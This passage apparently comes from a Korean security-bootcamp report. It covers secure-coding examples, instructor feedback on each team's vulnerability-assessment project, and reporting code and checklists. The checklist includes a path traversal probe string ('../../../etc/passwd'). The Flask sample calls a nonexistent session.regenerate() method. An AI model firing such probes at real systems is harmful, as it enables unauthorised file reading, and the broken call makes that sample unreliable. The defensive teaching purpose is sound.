    if (originalFilename.contains("..") || originalFilename.contains("/") || originalFilename.contains("\\")) {
        return ResponseEntity.badRequest().body("잘못된 파일 이름입니다.");
    }

    // 4. MIME 타입 검증
    String contentType = file.getContentType();
    List<String> allowedMimeTypes = Arrays.asList(
        "image/jpeg", "image/png", "application/pdf",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    );

    if (!allowedMimeTypes.contains(contentType)) {
        return ResponseEntity.badRequest().body("허용되지 않은 파일 타입입니다.");
    }

    // 5. 파일 이름 재생성 (랜덤 UUID 사용)
    String newFilename = UUID.randomUUID().toString() + "." + extension;

    // 6. 안전한 경로에 저장 (웹 루트 외부)
    Path uploadPath = Paths.get("/var/uploads");  // 웹 루트 외부
    if (!Files.exists(uploadPath)) {
        Files.createDirectories(uploadPath);
    }

    Path filePath = uploadPath.resolve(newFilename);

    // 7. 파일 저장
    Files.copy(file.getInputStream(), filePath, StandardCopyOption.REPLACE_EXISTING);

    // 8. 파일 권한 설정 (644)
    Set<PosixFilePermission> perms = new HashSet<>();
    perms.add(PosixFilePermission.OWNER_READ);
    perms.add(PosixFilePermission.OWNER_WRITE);
    perms.add(PosixFilePermission.GROUP_READ);
    perms.add(PosixFilePermission.OTHERS_READ);
    Files.setPosixFilePermissions(filePath, perms);

    // 9. DB에 파일 정보 저장
    FileMetadata metadata = new FileMetadata();
    metadata.setOriginalFilename(originalFilename);
    metadata.setStoredFilename(newFilename);
    metadata.setFilePath(filePath.toString());
    metadata.setFileSize(file.getSize());
    metadata.setUploadDate(LocalDateTime.now());

    fileRepository.save(metadata);

    return ResponseEntity.ok("파일 업로드 성공");
}
```

**강사 피드백 (전체)**:
"취약점을 직접 구현하고 수정하면서 안전한 코딩 패턴을 체득한 것이 매우 중요합니다. 이런 경험이 실무에서 보안 버그를 예방하는 데 큰 도움이 됩니다."

#### (2) 프레임워크별 보안 기능 활용

**Spring Boot Security (5조 사례)**:
```java
// Spring Security 설정

@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            // CSRF 보호 활성화
            .csrf()
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            .and()

            // 인가 설정
            .authorizeRequests()
                .antMatchers("/admin/**").hasRole("ADMIN")
                .antMatchers("/api/**").authenticated()
                .anyRequest().permitAll()
            .and()

            // 폼 로그인
            .formLogin()
                .loginPage("/login")
                .defaultSuccessUrl("/dashboard")
                .failureUrl("/login?error")
            .and()

            // 로그아웃
            .logout()
                .logoutUrl("/logout")
                .logoutSuccessUrl("/")
                .invalidateHttpSession(true)
                .deleteCookies("JSESSIONID")
            .and()

            // 세션 관리
            .sessionManagement()
                .sessionFixation().changeSessionId()  // 세션 고정 방지
                .maximumSessions(1)  // 동시 세션 제한
                .maxSessionsPreventsLogin(true)  // 중복 로그인 방지
            .and()
            .and()

            // 보안 헤더
            .headers()
                .contentTypeOptions()
                .and()
                .xssProtection()
                .and()
                .cacheControl()
                .and()
                .httpStrictTransportSecurity()
                .includeSubDomains(true)
                .maxAgeInSeconds(31536000)
                .and()
                .frameOptions().deny();  // Clickjacking 방지
    }

    @Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception {
        auth
            .userDetailsService(userDetailsService)
            .passwordEncoder(passwordEncoder());
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        // bcrypt 사용 (비밀번호 해싱)
        return new BCryptPasswordEncoder();
    }
}
```

**Flask Security (4조, 8조 사례)**:
```python
# Flask 보안 설정

from flask import Flask, session
from flask_wtf.csrf import CSRFProtect
from flask_talisman import Talisman
from werkzeug.security import generate_password_hash, check_password_hash
import secrets

app = Flask(__name__)

# 1. SECRET_KEY 설정 (강력한 랜덤 키)
app.config['SECRET_KEY'] = secrets.token_hex(32)

# 2. CSRF 보호
csrf = CSRFProtect(app)

# 3. 보안 헤더 (Flask-Talisman)
Talisman(app,
    force_https=True,
    strict_transport_security=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self'",
        'style-src': "'self' 'unsafe-inline'",
        'img-src': "'self' data:",
    }
)

# 4. 세션 쿠키 보안 설정
app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
app.config['SESSION_COOKIE_HTTPONLY'] = True  # JavaScript 접근 차단
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # CSRF 방지

# 5. 안전한 비밀번호 해싱
@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    password = request.form['password']

    # bcrypt로 해싱
    hashed_password = generate_password_hash(password, method='pbkdf2:sha256', salt_length=16)

    # DB 저장
    user = User(username=username, password=hashed_password)
    db.session.add(user)
    db.session.commit()

    return "User registered"

# 6. 안전한 로그인 검증
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    user = User.query.filter_by(username=username).first()

    if user and check_password_hash(user.password, password):
        # 세션 재생성 (Session Fixation 방지)
        session.clear()
        session['user_id'] = user.id
        session.regenerate()  # 세션 ID 재생성

        return "Login successful"
    else:
        return "Login failed", 401

# 7. SQL Injection 방지 (SQLAlchemy ORM)
@app.route('/user')
def get_user():
    email = request.args.get('email')

    # ORM 사용 (자동으로 파라미터 바인딩)
    user = User.query.filter_by(email=email).first()

    return jsonify(user.to_dict())

# 8. XSS 방지 (Jinja2 자동 이스케이프)
# templates/user.html
# {{ username }}  <!-- 자동으로 HTML 이스케이프 -->
# {{ description | safe }}  <!-- safe 필터는 주의해서 사용 -->
```

## 7.4 강사 종합 평가 및 피드백

### 7.4.1 강사의 전체 평가

STT 파일의 마지막 부분에서 강사가 전체 프로젝트에 대해 다음과 같이 평가했습니다.

**강사 종합 평가 (원문)**:
```
"모두 고생 많으셨고 이걸로 최종 마지막 팀까지 발표를 마쳤고요. 제가 일단 느낀 거는 전체 팀 진행하면서 느낀 건
기수가 진행될수록 점점 아웃풋이 좋아져요. 기간이 굉장히 짧아가지고 사실 옛날에는 제가 이렇게 진행을 하고 모듈 프로젝트를 수행하면
제가 전달했던 내용에 절반도 담기가 힘들고 뭐 이러고 시간도 부족하고 이랬었는데 제가 봐왔던 모듈 프로젝트 팀 중에
이번 기수 팀이 지금까지 나왔던 아웃풋 중에 모듈 프로젝트에 한해서, 모듈 프로젝트에 한해서 나왔던 아웃풋 중에 제일 우수했던 것 같아요.

그래서 팀별로 나름대로 저도 평가를 한다고 했는데 팀 편차가 그렇게 크지가 않아요. 다들 거의 비슷비슷해서
조금 더 잘했다, 조금 더 못했다, 이거는 조금 아쉽다 이런 것들이 조금씩은 있겠죠. 조마다 아쉬운 사운드가 있는데 제가 봤을 때는
지금 나온 모듈 프로젝트의 결과를 가지고 최종 프로젝트에 충분히 활용 가능한 수준으로 여러분들이 잘 따라와 준 것 같고

발표 중간중간에 제가 강조했던 내용이나 이런 것들을 반영하려고 신경 쓴 게 중간중간에 보이는데 그럴 때마다 되게 좀 뿌듯했거든요.
여러분들이 잘 따라와 준 것 같아서 나도 나름대로 뿌듯하고 고맙고 나중에 제가 여러분들 이 기수 마칠 때
여러분들이 얼마라만큼 취업이 되고 아웃풋이 어떻게 나왔는지 제가 꼭 신경 써서 챙겨볼게요.

모두 다 지금까지 수고 많으셨고요."
```

**평가 요약**:
1. **역대 최고 수준**: "이번 기수 팀이 지금까지 나왔던 아웃풋 중에 모듈 프로젝트에 한해서 제일 우수했던 것 같아요."
2. **팀 간 편차 적음**: "팀별로 나름대로 저도 평가를 한다고 했는데 팀 편차가 그렇게 크지가 않아요. 다들 거의 비슷비슷해서"
3. **실무 활용 가능**: "지금 나온 모듈 프로젝트의 결과를 가지고 최종 프로젝트에 충분히 활용 가능한 수준"
4. **강사 피드백 반영**: "발표 중간중간에 제가 강조했던 내용이나 이런 것들을 반영하려고 신경 쓴 게 중간중간에 보이는데 그럴 때마다 되게 좀 뿌듯했거든요."

### 7.4.2 팀별 상세 피드백 종합

각 팀에 대한 강사의 피드백을 종합하여 정리합니다.

#### 10조 (교육현장 보안 프로젝트)

**긍정적 피드백**:
- "수동 테스트를 병행한 것은 좋았습니다."
- "Kali Linux 도구 사용이 우수했습니다."

**개선 사항**:
- "자동화 도구와의 결과 비교가 부족했습니다."
- "커스텀 스크립트 개발이 더 필요했습니다."
- "리포트가 텍스트 기반이라 가독성이 떨어집니다."

**실무 적용 시 주의사항**:
```
1. 외부 도구(SQLMap, Nikto 등)와 자체 개발 스크립트를 병행하되, 결과를 비교 검증할 것
2. 텍스트 리포트보다는 PDF나 HTML 형식으로 시각화하여 제공할 것
3. 커스텀 스크립트를 모듈화하여 재사용 가능하게 만들 것
```

#### 7조 (LMS 플러그인 진단)

**긍정적 피드백**:
- "Stryker AI 활용이 인상적이었습니다."
- "Streamlit 대시보드가 실무적이었습니다."
- "KISA 67개 항목을 모두 점검한 것은 매우 체계적이었습니다."

**개선 사항**:
- "SAST 결과의 오탐률 처리 방안이 부족했습니다."
- "플러그인 시스템의 보안 경계(Sandbox)가 명확하지 않았습니다."

**실무 적용 시 주의사항**:
```
1. SAST 도구는 오탐률이 높으므로 반드시 수동 검증 병행
2. AI 스캐너 결과도 100% 신뢰하지 말고, 핵심 취약점은 수동으로 재확인
3. Streamlit 대시보드는 실시간 모니터링에 유용하나, 최종 리포트는 PDF로 제공
```

#### 6조 (합격 - 국가 자격시험 서비스)

**긍정적 피드백**:
- "시험 접수 시스템의 IDOR 취약점 구현이 실제 공격 시나리오와 유사했습니다."
- "실시간 모니터링 기능이 실무적이었습니다."

**개선 사항**:
- "대규모 동시 접속 시 성능 테스트가 부족했습니다."
- "Selenium 자동화는 좋았으나, 더 다양한 시나리오가 필요했습니다."

**실무 적용 시 주의사항**:
```
1. 공공서비스는 동시 접속자가 많으므로 부하 테스트 필수 (JMeter, Locust 등)
2. IDOR 취약점은 실제로 가장 흔한 취약점이므로 반드시 점검
3. Selenium은 UI 테스트에 유용하지만, API 테스트는 requests 라이브러리가 더 효율적
```

#### 3조 (헬릭스 - DNA Lab 관리 시스템)

**긍정적 피드백**:
- "DNA Lab이라는 독특한 도메인 선정이 인상적이었습니다."
- "실험 데이터 관리의 보안 요구사항을 잘 이해하고 구현했습니다."

**개선 사항**:
- "바이오 도메인 특화 취약점 (예: 데이터 위변조 검증)이 더 필요했습니다."
- "MariaDB를 선택한 이유가 명확하지 않았습니다."

**실무 적용 시 주의사항**:
```
1. 도메인 특화 보안 요구사항을 명확히 파악할 것
2. 실험 데이터의 무결성 검증은 해시(SHA-256)나 디지털 서명 활용
3. 역할 기반 접근 제어(RBAC)는 필수
```

#### 1조 (AI 활용 주요정보통신기반시설 진단)

**긍정적 피드백**:
- "AI를 활용한 자동 분석이 인상적이었습니다."
- "로컬 스크립트 방식의 보안 설계가 우수했습니다."
- "원격 셸 실행 방식을 거부한 보안 고려가 좋았습니다."

**개선 사항**:
- "AI 모델의 정확도 검증이 부족했습니다."
- "AI가 생성한 결과를 사람이 검증하는 프로세스가 없었습니다."

**실무 적용 시 주의사항**:
```
1. AI 도구는 보조 수단으로만 사용하고, 최종 판단은 사람이 할 것
2. AI가 생성한 리포트는 반드시 검토 후 수정하여 제공
3. 로컬 스크립트 + Cron + JSON 전송 방식은 보안상 우수한 설계
```

#### 4조 (Safety Medical Center - 의료 데이터 보호)

**긍정적 피드백**:
- "Bastion Host 설계가 실무적이었습니다."
- "AI 제언이 구체적이었습니다."
- "의료 데이터의 특수성을 고려한 설계가 좋았습니다."

**개선 사항**:
- "AI 제언을 실제로 구현하지는 않았습니다."
- "환자 개인정보 마스킹 처리가 일부 화면에서 누락되었습니다."

**실무 적용 시 주의사항**:
```
1. 의료 데이터는 HIPAA, 개인정보보호법 등 법적 규제가 많으므로 주의
2. Bastion Host는 Private Subnet 접근 시 필수
3. AI 페이로드 학습으로 오탐률 감소는 실무에서도 유용한 접근
```

#### 5조 (OKure - 사내 그룹웨어)

**긍정적 피드백**:
- "수동 진단으로 자동화 스캐너를 검증한 접근이 매우 우수했습니다."
- "실제 진단 프로세스에서 필수적인 단계입니다."
- "코드 리뷰 능력이 뛰어났습니다."

**개선 사항**:
- "52개 진단 항목은 적은 편입니다. KISA 67개 항목을 권장합니다."
- "그룹웨어 특화 취약점을 더 발굴할 수 있었습니다."

**실무 적용 시 주의사항**:
```
1. 자동화 스캐너 결과를 수동으로 검증하는 프로세스는 필수
2. 화이트박스 + 블랙박스 통합 진단이 가장 정확
3. 그룹웨어는 파일 공유, 권한 관리 취약점이 많으므로 집중 점검
```

#### 8조 (금융권 서비스 진단)

**긍정적 피드백**:
- "Logic Bug 구현이 매우 인상적이었습니다."
- "The DAO 해킹 사례를 인용한 것이 좋았습니다."
- "XML 서버 정의 방식이 실무적이었습니다."

**개선 사항**:
- "서버 자동 식별 기능이 부족했습니다."
- "XML에서 category 필드로 식별하는 것은 좋으나, 서비스 포트 자동 탐지가 없었습니다."

**질문 및 답변**:
```
Q: "서비스를 자동 식별하는 방식이 어떻게 되나요?"
A: "XML의 category 필드(web, application, database)를 보고 식별합니다."

Q: "서비스 포트번호가 누락된 서버도 있는데요?"
A: "대부분 SSH(22번)로 접근하여 쉘 명령으로 진단하므로, 서비스 포트는 DB만 필요합니다(3306)."

Q: "열려있는 포트 확인은 어떻게 하나요?"
A: "SSH로 접속 후 'ss -tuln' 명령으로 확인합니다."
```

**실무 적용 시 주의사항**:
```
1. Logic Bug는 자동화 도구로 탐지 불가, 반드시 코드 리뷰 필요
2. 금융권은 비즈니스 로직 취약점이 치명적이므로 집중 점검
3. XML 서버 정의는 유지보수에 좋으나, 자동 탐지 기능 추가 권장
```

#### 9조 (화이트 가운 - 병원 웹사이트)

**긍정적 피드백**:
- "130개 항목은 이번 발표 중 가장 많은 진단 항목이었습니다."
- "Tomcat 9 선택 이유가 명확했습니다 (관공서/병원 호환)."
- "실제 2021년 서울대병원 해킹 사고를 배경으로 한 점이 좋았습니다."

**개선 사항**:
- "발표에서 코드 시연이 부족했습니다."
- "화면 캡처만 보여주고 실제 동작을 보여주지 않아 아쉬웠습니다."
- "PDF 리포트에 성공한 항목도 포함해야 합니다."

**질문 및 답변**:
```
Q: "발표에서 실제 구현 내용을 시연해주실 수 있나요?"
A: (웹사이트 시연) "관리자는 모든 댓글 수정 가능, 일반 사용자는 본인 댓글만 수정 가능"
A: (진단 스크립트) "모듈별로 나눠서 전체 실행 가능, 개별 실행도 가능"

Q: "PDF 리포트에 실패한 항목만 있는데, 성공한 항목도 포함해야 하지 않나요?"
A: "네, 알겠습니다. 다음에는 전체 항목 목록을 포함하겠습니다."
```

**실무 적용 시 주의사항**:
```
1. 발표 시 반드시 실제 동작을 시연할 것 (화면 캡처만으로는 부족)
2. PDF 리포트는 전체 항목(양호 + 취약)을 모두 포함할 것
3. Tomcat 선택 이유를 명확히 하는 것은 좋은 접근
4. 실제 사고 사례를 배경으로 하는 것은 프로젝트 동기 부여에 좋음
```

### 7.4.3 공통 개선 사항

강사가 여러 팀에 공통적으로 언급한 개선 사항을 정리합니다.

#### (1) 자동화 스캐너의 오탐률 처리

**문제점**:
- 대부분의 팀이 자동화 스캐너를 사용했으나, 오탐(False Positive) 제거 프로세스가 부족
- 스캐너 결과를 그대로 리포트에 포함하여 신뢰도 저하

**개선 방안**:
```python
# 오탐 제거 프로세스

def remove_false_positives(scanner_results):
    """자동화 스캐너 결과에서 오탐 제거"""

    verified_results = []

    for result in scanner_results:
        # 1. 심각도가 HIGH 이상인 경우 수동 검증 필수
        if result['severity'] in ['HIGH', 'CRITICAL']:
            print(f"[수동 검증 필요] {result['title']}")

            # 수동 검증 함수 호출
            is_real_vuln = manual_verification(result)

            if is_real_vuln:
                result['verified'] = True
                verified_results.append(result)
            else:
                result['verified'] = False
                result['status'] = 'FALSE_POSITIVE'
                # 오탐 이유 기록
                result['fp_reason'] = "실제 테스트 결과 취약하지 않음"

        # 2. 심각도가 MEDIUM 이하인 경우 자동 필터링
        else:
            # 오탐 패턴 확인
            if is_known_false_positive_pattern(result):
                result['status'] = 'FALSE_POSITIVE'
                result['fp_reason'] = "알려진 오탐 패턴"
            else:
                verified_results.append(result)

    return verified_results

def manual_verification(vulnerability):
    """수동 검증"""

    if vulnerability['type'] == 'SQL Injection':
        # 실제 SQL Injection 페이로드로 테스트
        return verify_sql_injection(vulnerability['url'], vulnerability['parameter'])

    elif vulnerability['type'] == 'XSS':
        # 실제 XSS 페이로드로 테스트
        return verify_xss(vulnerability['url'], vulnerability['parameter'])

    # ... 다른 취약점 유형

    return False

def is_known_false_positive_pattern(vulnerability):
    """알려진 오탐 패턴 확인"""

    fp_patterns = [
        # 예시: 특정 라이브러리의 버전 경고는 실제 취약하지 않을 수 있음
        {
            'type': 'Vulnerable Component',
            'pattern': 'lodash 4.17.15',
            'reason': '해당 버전은 실제로 패치됨'
        },
        # 예시: 개발 환경에서만 나타나는 경고
        {
            'type': 'Debug Mode Enabled',
            'pattern': 'DEBUG=True',
            'reason': '운영 환경에서는 비활성화됨'
        }
    ]

    for pattern in fp_patterns:
        if (vulnerability['type'] == pattern['type'] and
            pattern['pattern'] in str(vulnerability)):
            return True

    return False
```

#### (2) 리포트 품질 향상

**문제점**:
- 일부 팀은 텍스트 기반 리포트로 가독성 저하
- 실패한 항목만 표시하고 성공한 항목은 생략
- 조치 방안이 추상적이거나 누락

**개선 방안**:
```python
# 고품질 리포트 생성

def generate_professional_report(diagnosis_results):
    """전문적인 진단 리포트 생성"""

    report = {
        "metadata": {
            "title": "보안 진단 리포트",
            "date": datetime.now().strftime("%Y-%m-%d"),
            "target": diagnosis_results['target'],
            "diagnosis_standard": "OWASP Top 10 2021 + KISA 67개 항목",
            "auditor": "Security Team"
        },

        "executive_summary": {
            "총진단항목": diagnosis_results['total_items'],
            "취약항목": diagnosis_results['vulnerable'],
            "양호항목": diagnosis_results['safe'],
            "정보항목": diagnosis_results['info'],
            "종합평가": calculate_security_score(diagnosis_results)
        },

        "vulnerability_summary": generate_vulnerability_summary(diagnosis_results),

        "detailed_findings": [],

        "remediation_plan": generate_remediation_plan(diagnosis_results),

        "appendix": {
            "진단도구": ["Custom Python Scanner", "SQLMap", "Nmap"],
            "참고자료": [
                "OWASP Top 10 2021",
                "KISA 주요정보통신기반시설 취약점 진단 가이드",
                "CWE Top 25"
            ]
        }
    }

    # 상세 발견 사항 (취약 + 양호 모두 포함)
    for item in diagnosis_results['items']:
        finding = {
            "id": item['id'],
            "category": item['category'],
            "name": item['name'],
            "result": item['result'],  # PASS, FAIL, INFO
            "severity": item.get('severity', 'N/A'),
            "description": item['description'],
            "evidence": item['evidence'],
            "cvss_score": item.get('cvss_score', 'N/A'),
            "cwe_id": item.get('cwe_id', 'N/A'),
            "owasp_mapping": item.get('owasp_mapping', 'N/A')
        }

        # 취약한 경우에만 조치 방안 추가
        if item['result'] == 'FAIL':
            finding['recommendation'] = item['recommendation']
            finding['remediation_code'] = item.get('remediation_code', '')
            finding['remediation_effort'] = estimate_remediation_effort(item)
            finding['priority'] = calculate_priority(item)

        report['detailed_findings'].append(finding)

    return report

def calculate_security_score(results):
    """보안 점수 계산 (0-100)"""

    # 가중치 적용
    weight_high = 3
    weight_medium = 2
    weight_low = 1

    total_score = 0
    max_score = 0

    for item in results['items']:
        if item['severity'] == 'HIGH':
            max_score += weight_high
            if item['result'] == 'PASS':
                total_score += weight_high
        elif item['severity'] == 'MEDIUM':
            max_score += weight_medium
            if item['result'] == 'PASS':
                total_score += weight_medium
        else:  # LOW
            max_score += weight_low
            if item['result'] == 'PASS':
                total_score += weight_low

    security_score = (total_score / max_score) * 100 if max_score > 0 else 0

    # 등급 부여
    if security_score >= 90:
        grade = "A (매우 우수)"
    elif security_score >= 80:
        grade = "B (우수)"
    elif security_score >= 70:
        grade = "C (보통)"
    elif security_score >= 60:
        grade = "D (미흡)"
    else:
        grade = "F (매우 미흡)"

    return {
        "score": round(security_score, 1),
        "grade": grade,
        "max_score": max_score,
        "achieved_score": total_score
    }

def generate_remediation_plan(results):
    """조치 계획 생성"""

    # 취약점을 우선순위별로 정렬
    vulnerabilities = [item for item in results['items'] if item['result'] == 'FAIL']
    vulnerabilities.sort(
        key=lambda x: (
            {'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1}.get(x['severity'], 0),
            x.get('cvss_score', 0)
        ),
        reverse=True
    )

    plan = {
        "immediate_action": [],  # 즉시 조치 (CRITICAL, HIGH)
        "short_term": [],        # 단기 조치 (MEDIUM)
        "long_term": []          # 장기 조치 (LOW)
    }

    for vuln in vulnerabilities:
        action_item = {
            "item": vuln['name'],
            "severity": vuln['severity'],
            "effort": estimate_remediation_effort(vuln),
            "responsible": "시스템 관리자" if vuln['category'] in ['OS', 'DB'] else "개발팀",
            "deadline": calculate_deadline(vuln),
            "steps": generate_remediation_steps(vuln)
        }

        if vuln['severity'] in ['CRITICAL', 'HIGH']:
            plan['immediate_action'].append(action_item)
        elif vuln['severity'] == 'MEDIUM':
            plan['short_term'].append(action_item)
        else:
            plan['long_term'].append(action_item)

    return plan

def estimate_remediation_effort(vulnerability):
    """조치 소요 시간 추정"""

    # 취약점 유형별 예상 소요 시간
    effort_estimates = {
        'SQL Injection': '2-4시간 (코드 수정)',
        'XSS': '1-2시간 (이스케이프 처리)',
        'CSRF': '1-2시간 (토큰 추가)',
        'IDOR': '2-3시간 (권한 검증 추가)',
        'File Upload': '3-4시간 (검증 로직 구현)',
        'Root Remote Login': '30분 (설정 변경)',
        'SUID/SGID Files': '1시간 (권한 변경)',
        'Weak Password Policy': '30분 (정책 변경)'
    }

    return effort_estimates.get(vulnerability['type'], '2-4시간')

def calculate_deadline(vulnerability):
    """조치 기한 계산"""

    today = datetime.now()

    if vulnerability['severity'] == 'CRITICAL':
        deadline = today + timedelta(days=1)  # 1일 이내
    elif vulnerability['severity'] == 'HIGH':
        deadline = today + timedelta(days=7)  # 1주일 이내
    elif vulnerability['severity'] == 'MEDIUM':
        deadline = today + timedelta(days=30)  # 1개월 이내
    else:  # LOW
        deadline = today + timedelta(days=90)  # 3개월 이내

    return deadline.strftime("%Y-%m-%d")

def generate_remediation_steps(vulnerability):
    """조치 단계 생성"""

    steps_templates = {
        'SQL Injection': [
            "1. 취약한 쿼리 위치 확인 ({location})",
            "2. Prepared Statement 또는 ORM 사용으로 변경",
            "3. 입력값 검증 로직 추가",
            "4. 수정 후 재진단 수행"
        ],
        'XSS': [
            "1. 출력 지점 확인 ({location})",
            "2. HTML 이스케이프 처리 추가",
            "3. Content Security Policy (CSP) 헤더 추가",
            "4. 수정 후 XSS 페이로드로 재테스트"
        ],
        'Root Remote Login': [
            "1. /etc/ssh/sshd_config 파일 열기",
            "2. PermitRootLogin no 설정",
            "3. sshd 서비스 재시작 (systemctl restart sshd)",
            "4. 설정 확인 (ssh root@server - 접속 거부 확인)"
        ]
    }

    steps = steps_templates.get(vulnerability['type'], [
        "1. 취약점 원인 분석",
        "2. 수정 방안 적용",
        "3. 재진단 수행"
    ])

    # 템플릿에 실제 값 대입
    return [step.format(**vulnerability) for step in steps]
```

#### (3) 진단 자동화 수준 향상

**강사 피드백**:
"자동화가 잘 되어 있는 팀도 있고, 수동 작업이 많은 팀도 있습니다. 실무에서는 반복적인 작업은 모두 자동화하고, 수동 검증은 핵심 취약점에만 집중해야 합니다."

**개선 방안**:
- Level 1-2 팀: 반복 작업을 스크립트화 (예: 서버 정보 수집, 포트 스캔)
- Level 3 팀: 진단 결과를 자동으로 분류하고 리포트 생성
- Level 4-5 팀: 리포트 생성부터 대시보드까지 완전 자동화

#### (4) 실제 시연 부족

**문제점** (특히 9조):
- 발표에서 화면 캡처만 보여주고 실제 동작 시연 없음
- 코드 설명이 부족하여 실제 구현 내용 파악 어려움

**개선 방안**:
```
발표 시 반드시 포함해야 할 시연:
1. 웹 애플리케이션 주요 기능 시연 (로그인, 권한별 화면 등)
2. 취약점 구현 시연 (실제 공격 페이로드 주입)
3. 진단 스크립트 실행 시연 (전체 또는 일부 항목)
4. 진단 결과 리포트 확인 시연 (PDF, 대시보드 등)
5. 핵심 코드 설명 (IDE 또는 화면 공유)
```

## 7.5 종합 정리 및 실무 적용 가이드

### 7.5.1 모듈 프로젝트 핵심 성과

이번 SK Shielders Rookies 모듈 프로젝트를 통해 달성한 핵심 성과를 정리합니다.

**1. 보안 진단 방법론 체득**
- 5단계 진단 프로세스 (사전 준비 → 정보 수집 → 취약점 점검 → 결과 분석 → 리포트 생성)
- 화이트박스, 블랙박스, 그레이박스 접근 방식 이해
- OWASP Top 10, KISA 가이드 등 표준 진단 기준 활용

**2. 자동화 능력 향상**
- Python 기반 진단 스크립트 개발
- 외부 도구(SQLMap, Nmap, Stryker AI 등) 활용
- 리포트 자동 생성 (PDF, HTML, Streamlit 대시보드)

**3. 인프라 보안 설계**
- AWS 3-Tier 아키텍처 구축
- Public/Private Subnet 분리
- Bastion Host를 통한 안전한 접근
- SSH 터널링 기법 적용

**4. 안전한 코딩 실력**
- SQL Injection, XSS, CSRF 등 취약점 이해
- Prepared Statement, 이스케이프 처리, CSRF 토큰 등 방어 기법
- Spring Security, Flask-WTF 등 프레임워크 보안 기능 활용

**5. 실무 역량**
- 팀 협업 (평균 4-5명)
- 발표 및 시연 능력
- 강사 피드백 수용 및 개선

### 7.5.2 최종 프로젝트 활용 방안

강사가 강조한 것처럼, 이번 모듈 프로젝트의 결과물은 "최종 프로젝트에 충분히 활용 가능한 수준"입니다.

**모듈 프로젝트 → 최종 프로젝트 전환 가이드**:

```python
# 모듈 프로젝트 산출물 재사용 가이드

# 1. 진단 스크립트 모듈화
# 기존 코드를 모듈화하여 재사용 가능하게 만들기

# Before (모듈 프로젝트)
def check_sql_injection():
    # LMS 시스템에 특화된 코드
    url = "http://lms.com/api/user"
    ...

# After (최종 프로젝트 - 범용화)
def check_sql_injection(target_url, param_name):
    # 모든 시스템에 적용 가능
    url = f"{target_url}/api/endpoint"
    ...

# 2. 설정 파일로 타겟 변경
# config.yml
target:
  url: "http://final-project.com"
  api_endpoints:
    - "/api/user"
    - "/api/products"
  credentials:
    username: "admin"
    password: "password"

# 3. 리포트 템플릿 재사용
# report_template.md를 최종 프로젝트에 맞게 수정

# 4. 인프라 코드 (Terraform) 재사용
# terraform/modules를 그대로 사용하되, 변수만 변경

# 5. 진단 기준 확장
# KISA 67개 항목 → KISA 67개 + 자체 기준 추가
```

**최종 프로젝트에 추가할 요소**:
```
1. 더 많은 진단 항목 (100개 이상)
2. 더 정교한 자동화 (CI/CD 통합)
3. 대시보드 고도화 (실시간 모니터링)
4. 취약점 트렌드 분석 (시간대별, 유형별)
5. 자동 재진단 (Cron Job)
6. 알림 기능 (Slack, 이메일)
7. 취약점 DB 구축 (과거 진단 이력 저장)
```

### 7.5.3 실무 진단 프로젝트 체크리스트

실무에서 보안 진단 프로젝트를 수행할 때 반드시 확인해야 할 체크리스트입니다.

**사전 준비 단계**:
```
[ ] 진단 대상 시스템 명확히 정의 (URL, IP, 서버 목록)
[ ] 진단 범위 합의 (웹/WAS/DB/OS/네트워크)
[ ] 진단 기준 선택 (OWASP, KISA, PCI DSS 등)
[ ] 진단 일정 수립 (시작일, 종료일, 중간 점검일)
[ ] 진단 권한 획득 (관리자 계정, SSH 키, API 키)
[ ] 비밀 유지 계약 체결 (NDA)
[ ] 긴급 연락망 구성 (담당자, 관리자)
[ ] 백업 확인 (진단 중 시스템 장애 대비)
```

**정보 수집 단계**:
```
[ ] 서버 OS 및 버전 확인
[ ] 웹 서버 종류 및 버전 (Nginx, Apache 등)
[ ] WAS 종류 및 버전 (Tomcat, Spring Boot 등)
[ ] DB 종류 및 버전 (MySQL, PostgreSQL 등)
[ ] 프레임워크 및 라이브러리 목록
[ ] 네트워크 토폴로지 파악
[ ] 열린 포트 목록
[ ] 방화벽 및 Security Group 설정
```

**취약점 점검 단계**:
```
[ ] SQL Injection 테스트 (모든 입력 필드)
[ ] XSS 테스트 (Stored, Reflected, DOM-based)
[ ] CSRF 테스트 (중요 기능: 비밀번호 변경, 송금 등)
[ ] 인증/인가 테스트 (IDOR, Broken Access Control)
[ ] 세션 관리 테스트 (Session Fixation, Hijacking)
[ ] 파일 업로드 테스트 (확장자, MIME 타입, 악성 파일)
[ ] Path Traversal 테스트 (../../../etc/passwd)
[ ] OS Command Injection 테스트
[ ] SSRF 테스트 (내부 네트워크 접근)
[ ] Logic Bug 테스트 (비즈니스 로직 취약점)
[ ] 서버 설정 점검 (루트 원격 접속, 디렉터리 리스팅 등)
[ ] 데이터베이스 보안 점검 (계정 권한, 패스워드 정책 등)
[ ] 암호화 점검 (HTTPS, 비밀번호 해싱 등)
```

**결과 분석 단계**:
```
[ ] False Positive 제거 (수동 검증)
[ ] 위험도 평가 (CVSS 스코어링)
[ ] OWASP Top 10 매핑
[ ] CWE 매핑
[ ] 근본 원인 분석
[ ] 영향 범위 파악
[ ] 악용 가능성 평가
```

**리포트 작성 단계**:
```
[ ] 진단 개요 (대상, 기준, 범위, 일정)
[ ] 진단 결과 요약 (전체 통계, 보안 점수)
[ ] 취약점 상세 내역 (취약 + 양호 모두 포함)
[ ] 조치 방안 (우선순위별, 단계별)
[ ] 조치 코드 예시
[ ] 재진단 가이드
[ ] 참고 자료
[ ] 부록 (진단 도구 목록, 용어 설명 등)
```

**사후 관리 단계**:
```
[ ] 리포트 전달 및 설명
[ ] 질의응답 (고객 질문 대응)
[ ] 조치 지원 (필요 시)
[ ] 재진단 수행 (조치 후)
[ ] 재진단 리포트 작성
[ ] 프로젝트 종료 보고
[ ] 진단 이력 DB 저장 (향후 참조)
```

### 7.5.4 마무리 및 소감

**강사의 마지막 당부**:
```
